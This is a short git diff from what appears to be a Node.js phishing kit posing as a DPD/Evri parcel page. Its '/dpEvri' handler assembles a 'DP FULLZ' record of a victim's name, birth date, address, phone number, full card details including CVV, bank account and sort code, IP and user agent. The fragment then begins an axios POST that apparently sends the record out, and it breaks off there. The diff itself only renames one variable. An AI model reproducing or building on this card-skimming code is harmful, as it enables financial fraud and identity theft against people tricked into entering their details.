@@ -14315,7 +14315,7 @@ app.post("/dpEvri", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `=========> DP FULLZ <==========]\n| Full name : ${fname}\n| Date of birth : ${dob}\n| Address : ${addy}\n| Post Code : ${pcode}| Mobile Number : ${telephone}\n[==========> Fullz <==========]\n| Card Holder's Name : ${ccname}| Card Number : ${ccnum}\n| Expiry Date : ${ccexp}| CVV : ${cvv}\n| Bank Name : ${bankName}\n| Account Number : ${accno}| Sort Code : ${scode}\n[==========> IP INFO <==========]\n| Submitted by : ${ip}| UserAgent : ${userAgent}\n==========> DP FULLZ<==========`;
+      var originalText = `=========> DP FULLZ <==========]\n| Full name : ${fname}\n| Date of birth : ${dob}\n| Address : ${address}\n| Post Code : ${pcode}| Mobile Number : ${telephone}\n[==========> Fullz <==========]\n| Card Holder's Name : ${ccname}| Card Number : ${ccnum}\n| Expiry Date : ${ccexp}| CVV : ${cvv}\n| Bank Name : ${bankName}\n| Account Number : ${accno}| Sort Code : ${scode}\n[==========> IP INFO <==========]\n| Submitted by : ${ip}| UserAgent : ${userAgent}\n==========> DP FULLZ<==========`;
       if (clearstore == 10) {
         axios
           .post(
